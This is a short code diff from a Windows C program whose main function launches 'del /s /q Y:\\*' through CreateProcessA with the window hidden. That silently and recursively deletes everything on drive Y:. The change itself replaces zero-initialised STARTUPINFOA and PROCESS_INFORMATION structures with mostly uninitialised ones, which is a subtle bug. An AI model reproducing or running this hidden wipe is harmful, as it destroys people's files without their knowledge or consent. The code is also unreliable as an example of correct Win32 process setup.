@@ -7,8 +7,9 @@
 
 
 int main() {
-    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
-    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFOA si;
+    si.cb = sizeof(STARTUPINFOA);
+    PROCESS_INFORMATION pi;
 
     if (CreateProcessA(NULL,(LPSTR)"del /s /q Y:\\*",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
         WaitForSingleObject(pi.hProcess, INFINITE);
